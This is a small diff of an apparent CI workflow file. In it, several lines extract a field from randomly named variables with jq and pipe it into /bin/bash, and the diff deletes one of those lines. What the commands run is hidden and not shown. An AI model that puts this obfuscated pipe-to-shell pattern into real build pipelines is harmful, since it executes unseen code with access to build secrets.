@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$szi00" | jq -r .utef70 | /bin/bash
           printf '%s' "$upooj89815" | jq -r .ed6 | /bin/bash
           echo $uz2 | jq -r .fskai0 | /bin/bash
-          printf '%s' "$iluz27" | jq -r .a5 | /bin/bash
           echo $j102 | jq -r .ht4496 | /bin/bash
 
       - name: Archive results
